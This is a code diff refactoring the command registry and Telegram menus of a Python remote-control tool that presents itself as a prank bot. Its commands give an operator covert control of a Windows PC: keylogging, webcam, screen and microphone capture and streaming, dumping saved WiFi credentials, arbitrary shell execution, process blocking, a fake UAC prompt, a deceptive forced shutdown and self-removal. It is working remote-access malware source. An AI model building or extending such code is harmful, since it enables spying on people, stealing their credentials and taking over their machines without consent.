@@ -68,7 +68,8 @@ import pyngrok
 from utils import *
 try:
     from plugins import *
-except ImportError:
+except ImportError as e:
+    print(f"Plugins not loaded\n{e}\n")
     plugins = None
 
 def resource_path(relative_path: str) -> str:
@@ -334,8 +335,6 @@ class PeppinoTelegram:
         self.webcam_url = None
         self.screen_url = None
         self.webcam_and_screen_url = None
-
-        self.help = HELP
         self.process_killer_page = 0
         self.owner_name = ""
         self.cap = capture
@@ -363,147 +362,152 @@ class PeppinoTelegram:
         self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
         self.cmd_session_active: bool = False
 
-        LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")#TODO Update user
+        LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")
 
         #gets the function from the text
-        self.function_table: dict[str:Callable] = {
-            # 🏠 Main Menu & Navigation
-            "mainmenu": self.mainmenu,
-            "menu_system": self.menu_system,
-            "menu_network": self.menu_network,
-            "menu_camera": self.menu_camera,
-            "menu_audio": self.menu_audio,
-            "menu_soundfx": self.menu_soundfx,
-            "menu_pranks": self.menu_pranks,
-            "menu_control": self.menu_control,
-            "menu_input": self.menu_input,
-            "menu_messaging": self.menu_messaging,
-            "menu_cantopen": self.menu_cantopen,
-            "menu_keylogger": self.menu_keylogger,
-            "menu_misc": self.menu_misc,
-            "menu_plugins": self.menu_plugins,
+        self.commands = [
 
+            # 🏠 Main Menu & Navigation (no buttons here, just category)
+            Command("mainmenu", self.mainmenu, "Open the main menu.", "🏠 Menu", "🏠 Main Menu"),
+            Command("menu_system", self.menu_system, "Open System & Shutdown menu.", "🏠 Menu", "🛑 System & Shutdown"),
+            Command("menu_network", self.menu_network, "Open Network & Remote Access menu.", "🏠 Menu", "🌐 Network & Remote Access"),
+            Command("menu_camera", self.menu_camera, "Open Camera & Screen menu.", "🏠 Menu", "📸 Camera & Screen"),
+            Command("menu_audio", self.menu_audio, "Open Audio & Volume menu.", "🏠 Menu", "🔊 Audio & Volume"),
+            Command("menu_soundfx", self.menu_soundfx, "Open Sound Effects menu.", "🏠 Menu", "🎵 Sound Effects"),
+            Command("menu_pranks", self.menu_pranks, "Open Pranks & Visuals menu.", "🏠 Menu", "😈 Pranks & Visuals"),
+            Command("menu_control", self.menu_control, "Open System Control menu.", "🏠 Menu", "💻 System Control"),
+            Command("menu_input", self.menu_input, "Open Input / Device Control menu.", "🏠 Menu", "🎮 Input / Device Control"),
+            Command("menu_messaging", self.menu_messaging, "Open Messaging menu.", "🏠 Menu", "📋 Messaging"),
+            Command("menu_cantopen", self.menu_cantopen, "Open Can't Open List menu.", "🏠 Menu", "🔒 Can't Open List"),
+            Command("menu_keylogger", self.menu_keylogger, "Open Keylogger menu.", "🏠 Menu", "🧠 Keylogger"),
+            Command("menu_misc", self.menu_misc, "Open Misc menu.", "🏠 Menu", "🦑 Misc"),
+            Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "🏠 Menu", "🔌 Your Plugins"),
+            
             # 🛑 System & Shutdown
-            "shutdown": self.shutdown,
-            "fakeshutdown": self.fake_shutdown,
-            "fakeuac": self.fakeuac,
-            "selfdestruction": self.selfdestruction,
-            "clear": self.clear,
-            "altf4": self.altf4,
-
-            # 📸 Camera & Screen
-            "selfie": self.selfie,
-            "screenshot": self.screenshot,
-            "fullclip": self.record_webcam_and_screen,
-            "webcamclip": self.record_webcam,
-            "screenclip": self.record_screen,
-            "recordjum": self.record_jumpscare_reaction,
-            "waitforface": self.waitforface,
-            "checkforface": self.checkforface,
-            "displaymode": self.display_mode,
-            "webcamstreamstart": self.start_webcam_tunnel,
-            "screenstreamstart": self.start_screen_tunnel,
-            "webcamstreamstop": self.stop_webcam_tunnel,
-            "screenstreamstop": self.stop_screen_tunnel,
-            "webcamandscreenstreamstart": self.start_webcam_and_screen_tunnel,
-            "webcamandscreenstreamstop": self.stop_webcam_and_screen_tunnel,
-            "stop_all_tunnels":self.stop_all_tunnels,
-            "camerawallpaper": self.setCameraAsWallpaper,
-            "setvideowallpaper": self.setvideowallpaper,
-
-            # 🔊 Audio & Volume
-            "microphone": self.send_record_audio,
-            "mutevolume": lambda: self.audio_mixer.mute(),
-            "fullvolume": lambda: self.audio_mixer.full(),
-            "setvolume": self.audio_mixer.setVolumePercentage,
-            "getvolume": lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
-            "mixermenu": self.mixer_menu,
-            "playfromurl": play_from_url,
-            "playrandomnoise": self.playrandomnoise,
-
-            # 🎵 Sound Effects
-            "pss": self.pss,
-            "psst": self.pss,
-            "breath": self.breath,
-            "fart": self.fart,
-            "knockknock": self.knockknock,
-            "tralalerotralala": lambda: self.__play_loaded_sound("tralarero-tralala", volume=8),
-            "scream11s": self.scream_11s,
-            "scream15s": self.scream_15s,
-            "behindyou_kid": self.behindyou_kid,
-            "behindyou_whisper": self.behindyou_whisper,
-
-            # 😈 Pranks & Visuals
-            "jumpscare": self.jumpscare,
-            "jumpscarenoaudio": self.jumpscarenoaudio,
-            "invertedscreen": self.inverted_screen,
-            "distortedscreen": self.distorted_screen,
-            "messagebox": self.message_box,
-            "messagespam": self.spam_windows,
-            "hdmi_drowning_effect": self.wrapper_for_hdmi_overlay,
-            "stop_hdmi_drowning_effect": self.hdmiDrownerOverlayPlayer.stop,
-            "disturbed_overlay_and_random_noise": self.disturbed_overlay_and_random_noise,
-            "whisperoverlay": self.whisper_overlay,
-
-            # 🦑 Misc & Memes
-            "plankton": self.plankton,
-            "planktonnoaudio": self.planktonnoaudio,
-            "johnpork": self.johnpork,
-            "johnporknoaudio": self.johnporknoaudio,
-            "gabinetti": self.gabinetti,
-            "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
-            "duckyhelp": lambda: self.bsend(self.duckyhelp),
-            "browser": browseropen,
-
-            # 💻 System Control
-            "execute": lambda x: self.bsend(self.execute(x, return_output=True, shell=True)),
-            "processkiller": self.process_killer,
-            "terminateprocess": terminate_process_by_name,
-            "procmonadd": self.processmonitoradd,
-            "procmonrem": self.processmonitorrem,
-            "procmonmenu": self.processmonitormenushow,
-            "cmdsession": self.cmdsession,
-
-            # 🎮 Input / Device Control
-            "randomkeyboard": self.randomkeyboard,
-            "capslock": lambda: toducky("CAPSLOCK", execute=True),
-            "mousecontroller": self.mousecontroller,
-            "mouselock": self.mouselock,
-            "setMouseJump": self.setMouseJump,
-            "mouser": self.mouser,
-            "mousel": self.mousel,
-            "mouseu": self.mouseu,
-            "moused": self.moused,
-            "leftclick": self.leftclick,
-            "rightclick": self.rightclick,
-
-            # 📋 Messaging
-            "bsend": self.bsend,
-            "id": lambda: self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
-            "deletemessages": self.deleteallmessages,
-            "deleteallmessages": self.deleteallmessages,
-
-            # 🔒 Can't Open List
-            "cantopenadd": self.cantopen,
-            "cantopenremove": self.removefromcantopen,
-            "cantopenmenu": self.cantopenmenu,
-
-            # 🧠 Keylogger
-            "keylogger": self.keylogger,
-            "livekeylogger": self.live_keylogger,
+            Command("shutdown", self.shutdown, "Power off PC.", "🛑 System", "🛑 Shutdown"),
+            Command("fakeshutdown", self.fake_shutdown, "Fake shutdown sequence.", "🛑 System", "🎭 Fakeshutdown"),
+            Command("fakeuac", self.fakeuac, "Fake UAC prompt.", "🛑 System", "Fake UAC"),
+            Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "🛑 System", "💣 Selfdestruction"),
+            Command("clear", self.clear, "Clean windows, webcam, temp files.", "🛑 System", "🧹 Clear"),
+            Command("altf4", self.altf4, "Send Alt+F4.", "🛑 System", "⌨️ Altf4"),
 
             # 🌐 Network & Remote Access
-            "wifiinfo": self.wifiinfo,
-            "getip": self.getip,
-            "urltoast": notify_toast,
+            Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "🌐 Network", "📶 Wifiinfo"),
+            Command("getip", self.getip, "Get public IP and location.", "🌐 Network", "🌐 Get IP"),
+            Command("urltoast", notify_toast, "Show Windows toast with URL.", "🌐 Network", "🔗 URL Toast"),
+
+            # 📸 Camera & Screen
+            Command("selfie", self.selfie, "Take webcam photo.", "📸 Camera", "🤳 Webcam Snapshot"),
+            Command("screenshot", self.screenshot, "Capture screen.", "📸 Camera", "🖼️ Take Screenshot"),
+            Command("fullclip", self.record_webcam_and_screen, "Record webcam and screen.", "📸 Camera", "🎞️ Record Full Clip"),
+            Command("webcamclip", self.record_webcam, "Record webcam only.", "📸 Camera", "🎥 Record Webcam"),
+            Command("screenclip", self.record_screen, "Record screen only.", "📸 Camera", "🖥️ Record Screen"),
+            Command("recordjum", self.record_jumpscare_reaction, "Record jumpscare reaction.", "📸 Camera", "🎙️ Record Audio Jump"),
+            Command("waitforface", self.waitforface, "Capture photo when face detected.", "📸 Camera", "⏳ Waiting for Face"),
+            Command("checkforface", self.checkforface, "Check for face presence.", "📸 Camera", "🔍 Check for Face"),
+            Command("displaymode", self.display_mode, "Change display mode.", "📸 Camera", "🖼️ Display Options"),
+            Command("webcamstreamstart", self.start_webcam_tunnel, "Start webcam stream.", "📸 Camera", "📹🟢 Start Webcam Stream"),
+            Command("screenstreamstart", self.start_screen_tunnel, "Start screen stream.", "📸 Camera", "🖥️🟢 Start Screen Stream"),
+            Command("webcamstreamstop", self.stop_webcam_tunnel, "Stop webcam stream.", "📸 Camera", "📹🔴 Stop Webcam Stream"),
+            Command("screenstreamstop", self.stop_screen_tunnel, "Stop screen stream.", "📸 Camera", "🖥️🔴 Stop Screen Stream"),
+            Command("webcamandscreenstreamstart", self.start_webcam_and_screen_tunnel, "Start webcam and screen streams.", "📸 Camera", "📹🖥️🟢 Start Both Streams"),
+            Command("webcamandscreenstreamstop", self.stop_webcam_and_screen_tunnel, "Stop webcam and screen streams.", "📸 Camera", "📹🖥️🔴 Stop Both Streams"),
+            Command("stop_all_tunnels", self.stop_all_tunnels, "Stop all active streams.", "📸 Camera", "❌🔴 Stop All Streams"),
+            Command("camerawallpaper", self.setCameraAsWallpaper, "Set webcam as wallpaper.", "📸 Camera", "📷 Camera Wallpaper"),
+            Command("setvideowallpaper", self.setvideowallpaper, "Set video as wallpaper.", "📸 Camera", "🎞️ Set Video Wallpaper"),
+
+            # 🔊 Audio & Volume
+            Command("microphone", self.send_record_audio, "Record microphone audio.", "🔊 Audio", "🎙️ Microphone"),
+            Command("mutevolume", lambda: self.audio_mixer.mute(), "Mute system volume.", "🔊 Audio", "🔇 Mute Volume"),
+            Command("fullvolume", lambda: self.audio_mixer.full(), "Set volume to maximum.", "🔊 Audio", "🔊 Full Volume"),
+            Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "🔊 Audio", "🎚️ Set Volume"),
+            Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "🔊 Audio", "📊 Get Volume"),
+            Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "🔊 Audio", "🎛️ Mixer Menu"),
+            Command("playfromurl", play_from_url, "Play audio from URL.", "🔊 Audio", "🔗 Play from URL"),
+            Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "🔊 Audio", "📡 Play Noise"),
+            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay with audio.", "🔊 Audio", "🌀📻 Video&Sound Disturbance"),
+
+            # 🎵 Sound Effects
+            Command("pss", self.pss, "Play 'psst' sound.", "🎵 Sound FX", "👂 Psst"),
+            Command("psst", self.pss, "Alias for pss.", "🎵 Sound FX", "👂 Psst"),
+            Command("breath", self.breath, "Play breathing sound.", "🎵 Sound FX", "🌬️ Breath"),
+            Command("fart", self.fart, "Play fart sound.", "🎵 Sound FX", "💨 Fart"),
+            Command("knockknock", self.knockknock, "Play knocking sound.", "🎵 Sound FX", "🚪 Knock"),
+            Command("tralalerotralala", lambda: self.__play_loaded_sound("tralarero-tralala", volume=8), "Play Italian brainrot sound.", "🎵 Sound FX", "🎶 Tralalero"),
+            Command("scream11s", self.scream_11s, "Play 11-second scream.", "🎵 Sound FX", "😱 11s Scream"),
+            Command("scream15s", self.scream_15s, "Play 15-second scream.", "🎵 Sound FX", "😱 15s Scream"),
+            Command("behindyou_kid", self.behindyou_kid, "Play 'Behind you' child voice.", "🎵 Sound FX", "👶 Behind you (kid)"),
+            Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "🎵 Sound FX", "👻 Behind you (whisper)"),
+
+            # 😈 Pranks & Visuals
+            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "😈 Pranks", "👻 Jumpscare"),
+            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "😈 Pranks", "😶‍🌫️ Jumpscare noaudio"),
+            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "😈 Pranks", "🔄 Inverted Screen"),
+            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "😈 Pranks", "🌀 Distorted Screen"),
+            Command("messagebox", self.message_box, "Show custom message box.", "😈 Pranks", "💬 Message Box"),
+            Command("messagespam", self.spam_windows, "Spam message boxes.", "😈 Pranks", "📨 Message Spam"),
+            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "😈 Pranks", "📷 Camera Wallpaper"),
+            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "😈 Pranks", "🎞️ Set Video Wallpaper"),
+            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "😈 Pranks", "🖥️🌀 Video Signal Drowning Effect"),
+            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "😈 Pranks", "🌀📻 Video&Sound Disturbance"),
+            Command("whisperoverlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Whisper Overlay"),
+
+            # 🦑 Misc & Memes
+            Command("plankton", self.plankton, "Plankton jumpscare.", "🦑 Misc", "🦑 Plankton"),
+            Command("planktonnoaudio", self.planktonnoaudio, "Plankton without audio.", "🦑 Misc", "🔇 Plankton no audio"),
+            Command("johnpork", self.johnpork, "John Pork jumpscare.", "🦑 Misc", "🐷 Johnpork"),
+            Command("johnporknoaudio", self.johnporknoaudio, "John Pork without audio.", "🦑 Misc", "🔕 Johnpork no audio"),
+            Command("gabinetti", self.gabinetti, "Play Gabinetti meme.", "🦑 Misc", "🛋️ Gabinetti"),
+            Command("duckyscript", lambda *args: toducky(" ".join(args), execute=True), "Execute DuckyScript.", "🦑 Misc", "⌨️ Duckyscript"),
+            Command("duckyhelp", lambda: self.bsend(self.duckyhelp), "Show DuckyScript help.", "🦑 Misc", "❓ Duckyhelp"),
+            Command("browser", browseropen, "Open URL in browser.", "🦑 Misc", "🌐 Browser"),
+
+            # 💻 System Control
+            Command("execute", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "💻 System Control", "⚙️ Execute"),
+            Command("processkiller", self.process_killer, "Kill process from list.", "💻 System Control", "💀 Process Killer"),
+            Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "💻 System Control", "🛑 Terminate Process"),
+            Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "💻 System Control", "➕ Procmon Add"),
+            Command("procmonrem", self.processmonitorrem, "Remove process from monitor.", "💻 System Control", "➖ Procmon Remove"),
+            Command("procmonmenu", self.processmonitormenushow, "Show process monitor menu.", "💻 System Control", "📊 Procmon Menu"),
+            Command("cmdsession", self.cmdsession, "Open interactive CMD session.", "💻 System Control", "</> CMDSession"),
+
+            # 🎮 Input / Device Control
+            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "🎮 Input", "🎹 Randomkeyboard"),
+            Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "🎮 Input", "🔠 Capslock"),
+            Command("mouselock", self.mouselock, "Lock mouse position.", "🎮 Input", "🖱️ Mouselock"),
+            Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "🎮 Input", "🎮 Mousecontroller"),
+            Command("setMouseJump", self.setMouseJump, "Set mouse jump distance.", "🎮 Input", "🎯 Set Mouse Jump"),
+            Command("mouser", self.mouser, "Move mouse right.", "🎮 Input", "➡️ Move Right"),
+            Command("mousel", self.mousel, "Move mouse left.", "🎮 Input", "⬅️ Move Left"),
+            Command("mouseu", self.mouseu, "Move mouse up.", "🎮 Input", "⬆️ Move Up"),
+            Command("moused", self.moused, "Move mouse down.", "🎮 Input", "⬇️ Move Down"),
+            Command("leftclick", self.leftclick, "Left mouse click.", "🎮 Input", "🖱️ Left Click"),
+            Command("rightclick", self.rightclick, "Right mouse click.", "🎮 Input", "🖱️ Right Click"),
+
+            # 📋 Messaging
+            Command("bsend", self.bsend, "Send text message.", "📋 Messaging", "📤 Bsend"),
+            Command("id", lambda: self.bsend(f"CHAT_ID: {self.owner_id}"), "Send chat ID.", "📋 Messaging", "🆔 Id"),
+            Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "📋 Messaging", "❌ Deletemessages"),
+            Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "📋 Messaging", "🗑️ Deleteallmessages"),
+
+            # 🔒 Can't Open List
+            Command("cantopenadd", self.cantopen, "Block process execution.", "🔒 Can't Open", "🚫 Cantopenadd"),
+            Command("cantopenremove", self.removefromcantopen, "Unblock process execution.", "🔒 Can't Open", "❌ Cantopenremove"),
+            Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "🔒 Can't Open", "📋 Cantopenmenu"),
+
+            # 🧠 Keylogger
+            Command("keylogger", self.keylogger, "Log keystrokes to file.", "🧠 Keylogger", "⌨️ Keylogger"),
+            Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "🧠 Keylogger", "📡 Livekeylogger"),
 
             # 🔧 Utilities & Testing
-            "stop": self.stop,
-            "test": self.test,
-            "help": lambda: self.bsend(self.help),
-            "nothing": lambda: ...,
-        }
+            Command("stop", self.stop, "Stop current operation.", "🔧 Utility", "🛑 Stop"),
+            Command("test", self.test, "Run test routine.", "🔧 Utility", "🧪 Test"),
+            Command("help", lambda: self.bsend(self.help), "Show help menu.", "🔧 Utility", "❓ Help"),
+            Command("nothing", lambda: ..., "No-op command.", "🔧 Utility", "Nothing"),
+        ]
 
+        self.help = generate_help(self.commands)
+        self.function_table = {x.name:x.function for x in self.commands}
         LOADING_STATUS_MESSAGE.edit("COMMANDS LOADED, LOADING PLUGINS")
 
         if plugins:
@@ -785,8 +789,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.bsend(f"Output: {output}")
 
     def extract_commands(self) -> list[dict]:
-        commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
-        return [{'command': cmd, 'description': desc} for cmd, desc in commands]
+        return [{"command":c.name, "description":c.description} for c in self.commands]
 
     def fake_shutdown(self) -> None:
         system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
@@ -953,16 +956,31 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         state["running"]=False
         bar.fill_and_delete()
         
-    def load_plugins(self, bot: Bot, plugin_classes: list[type[Plugin]]) -> dict[str,dict[str,Callable]]:
+    def load_plugins(self, bot: Bot, plugin_classes: list[type[Plugin]]) -> dict[str, dict[str, Callable]]:
+        """
+        Instantiate and bind all plugins, then export their commands for the bot.
+        Returns a registry mapping button labels to (Command, action) tuples.
+        """
         registry = {}
 
         for cls in plugin_classes:
             plugin = cls()
             plugin.bind_bot(bot)
             plugin.bind_pep(self)
+
             exported = plugin.export()
             registry.update(exported)
+
+        for label, (command, action, description) in registry.items():
+            new_command = Command(name=command,
+                                  function=action,
+                                  description=description,
+                                  category="🔌 PlugIns",
+                                  label=label)
+            self.commands.append(new_command)
+            self.function_table.update({command:action})
         return registry
+
 
     def message_box(self, text: str, title: str = "Warning") -> int:
         def run():
@@ -1030,243 +1048,102 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         bar.fill_and_delete()
 
     def mainmenu(self):
-        buttons = {
-            "🛑 System & Shutdown": "/menu_system",
-            "🌐 Network & Remote Access": "/menu_network",
-            "📸 Camera & Screen": "/menu_camera",
-            "🔊 Audio & Volume": "/menu_audio",
-            "🎵 Sound Effects": "/menu_soundfx",  # NEW MENU
-            "😈 Pranks & Visuals": "/menu_pranks",
-            "💻 System Control": "/menu_control",
-            "🎮 Input / Device Control": "/menu_input",
-            "📋 Messaging": "/menu_messaging",
-            "🔒 Can't Open List": "/menu_cantopen",
-            "🧠 Keylogger": "/menu_keylogger",
-            "🦑 Misc": "/menu_misc",
-            "🔌 PlugIns": "/menu_plugins",
-        }
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
-
-    def menu_plugins(self):
-        buttons = {"🔙 Back": "/mainmenu"}
-        buttons.update(self.plugins_buttons)
-        if buttons:
-            if self.mainmenu_ref:
-                self.mainmenu_ref.delete()
-            self.mainmenu_ref = self.new_menu(buttons, label="🔌 Your Plugins", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        else:
-            self.bsend("🔌No plugins loaded")
-
-    def menu_system(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🛑 Shutdown": "/shutdown",
-            "🎭 Fakeshutdown": "/fakeshutdown",
-            "⌨️ Altf4": "/altf4",
-            "🧹 Clear": "/clear",
-            "💣 Selfdestruction": "/selfdestruction",
-            "Fake UAC":"/fakeuac",
-        }
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
-
-    def menu_network(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "📶 Wifiinfo": "/wifiinfo",
-            "🌐 Getip": "/getip",
-        }
+        buttons = {}
+        for category, label, submenu in [
+            ("🛑 System", "🛑 System & Shutdown", "/menu_system"),
+            ("🌐 Network", "🌐 Network & Remote Access", "/menu_network"),
+            ("📸 Camera", "📸 Camera & Screen", "/menu_camera"),
+            ("🔊 Audio", "🔊 Audio & Volume", "/menu_audio"),
+            ("🎵 Sound FX", "🎵 Sound Effects", "/menu_soundfx"),
+            ("😈 Pranks", "😈 Pranks & Visuals", "/menu_pranks"),
+            ("💻 System Control", "💻 System Control", "/menu_control"),
+            ("🎮 Input", "🎮 Input / Device Control", "/menu_input"),
+            ("📋 Messaging", "📋 Messaging", "/menu_messaging"),
+            ("🔒 Can't Open", "🔒 Can't Open List", "/menu_cantopen"),
+            ("🧠 Keylogger", "🧠 Keylogger", "/menu_keylogger"),
+            ("🦑 Misc", "🦑 Misc", "/menu_misc"),
+            ("🔌 PlugIns", "🔌 Your Plugins", "/menu_plugins"),
+        ]:
+            buttons[label] = submenu
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
 
-    def menu_camera(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🤳 Webcam Snapshot": "/selfie",
-            "🖼️ Take Screenshot": "/screenshot",
-            "🎞️ Record Full Clip": "/fullclip",
-            "🎥 Record Webcam": "/webcamclip",
-            "🖥️ Record Screen": "/screenclip",
-            "🎙️ Record Audio Jump": "/recordjum",
-            "⏳ Waiting for Face": "/waitforface",
-            "🖼️ Display Options": "/displaymode",
-            "📹🟢 Start Webcam Stream": "/webcamstreamstart",
-            "🖥️🟢 Start Screen Stream": "/screenstreamstart",
-            "📹🔴 Stop Webcam Stream": "/webcamstreamstop",
-            "🖥️🔴 Stop Screen Stream": "/screenstreamstop",
-            "📹🖥️🟢 Start Webcam & Screen Stream": "/webcamandscreenstreamstart",
-            "📹🖥️🔴 Stop Webcam & Screen Stream": "/webcamandscreenstreamstop",
-            "❌🔴 Stop All Streams":"/stop_all_tunnels",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
-
-    def menu_audio(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🎙️ Microphone": "/microphone",
-            "🔇 Mute volume": "/mutevolume",
-            "🔊 Full volume": "/fullvolume",
-            "🎚️ Set volume": "/setvolume",
-            "📊 Get volume": "/getvolume",
-            "🎛️ Mixer menu": "/mixermenu",
-            "🔗 Play from URL": "/playfromurl",
-            "📡 Play Noise": "/playrandomnoise",
-            "🌀📻 Video&Sound Disturbance": "/disturbed_overlay_and_random_noise",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
-
-    def menu_soundfx(self):
-        """Sound effects menu"""
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🌬️ Breath": "/breath",
-            "💨 Fart": "/fart",
-            "🚪 Knock": "/knockknock",
-            "👂 Psst": "/pss",
-            "🎶 Tralalero": "/tralalerotralala",
-
-            ## Theese are the horror ones
-            "😱 11s Scream": "/scream11s",
-            "😱 15s Scream": "/scream15s",
-            "👶 Behind you (kid)": "/behindyou_kid",
-            "👻 Behind you (whisper)": "/behindyou_whisper",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(
-            buttons, 
-            label="🎵 Sound Effects", 
-            next_btn=True, 
-            close_btn_lab="mainmenu_close", 
-            next_btn_lab="mainmenu_next", 
+        self.mainmenu_ref = ButtonsMenu(
+            chat_id=self.owner_id,
+            bot=self.bot,
+            buttons=buttons,
+            label="Select a category:",
+            close_btn_lab="mainmenu_close",
+            next_btn=True,
+            next_btn_lab="mainmenu_next",
             prev_btn_lab="mainmenu_prev"
         )
         return self.mainmenu_ref
 
-    def menu_pranks(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "👻 Jumpscare": "/jumpscare",
-            "👻 Whisper Overlay": "/whisperoverlay",
-            "😶‍🌫️ Jumpscare noaudio": "/jumpscarenoaudio",
-            "🔄 Inverted screen": "/invertedscreen",
-            "🌀 Distorted screen": "/distortedscreen",
-            "💬 Message box": "/messagebox",
-            "📨 Message spam": "/messagespam",
-            "📷 Camera wallpaper": "/camerawallpaper",
-            "🎞️ Set video wallpaper": "/setvideowallpaper",
-            "🖥️🌀 Video Signal Drowning Effect":"hdmi_drowning_effect",
-            "🌀📻 Video&Sound Disturbance": "/disturbed_overlay_and_random_noise",
-        }
+    # Generic submenu generator
+    def generate_category_menu(self, category_name: str, menu_label: str = None):
+        buttons = {"🔙 Back": "/mainmenu"}
+        print(f"{category_name=}")
+        print(self.commands)
+        for cmd in [c for c in self.commands if c.category == category_name]:
+            buttons[cmd.label] = f"/{cmd.name}"
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
+
+        self.mainmenu_ref = ButtonsMenu(
+            chat_id=self.owner_id,
+            bot=self.bot,
+            buttons=buttons,
+            label=menu_label or category_name,
+            close_btn_lab="mainmenu_close",
+            next_btn=True,
+            next_btn_lab="mainmenu_next",
+            prev_btn_lab="mainmenu_prev"
+        )
         return self.mainmenu_ref
+
+
+    def menu_system(self):
+        return self.generate_category_menu("🛑 System", "🛑 System & Shutdown")
+
+    def menu_network(self):
+        return self.generate_category_menu("🌐 Network", "🌐 Network & Remote Access")
+
+    def menu_camera(self):
+        return self.generate_category_menu("📸 Camera", "📸 Camera & Screen")
+
+    def menu_audio(self):
+        return self.generate_category_menu("🔊 Audio", "🔊 Audio & Volume")
+
+    def menu_soundfx(self):
+        return self.generate_category_menu("🎵 Sound FX", "🎵 Sound Effects")
+
+    def menu_pranks(self):
+        return self.generate_category_menu("😈 Pranks", "😈 Pranks & Visuals")
 
     def menu_control(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "⚙️ Execute": "/execute",
-            "💀 Process killer": "/processkiller",
-            "🛑 Terminate process": "/terminateprocess",
-            "📊 Procmon menu": "/procmonmenu",
-            "➕ Procmon add": "/procmonadd",
-            "➖ Procmon remomve": "/procmonrem",
-            "</> CMDSession": "/cmdsession"
-        }
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
+        return self.generate_category_menu("💻 System Control", "💻 System Control")
 
     def menu_input(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🎹 Randomkeyboard": "/randomkeyboard",
-            "🔠 Capslock": "/capslock",
-            "🖱️ Mouselock": "/mouselock",
-            "🎮 Mousecontroller": "/mousecontroller",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
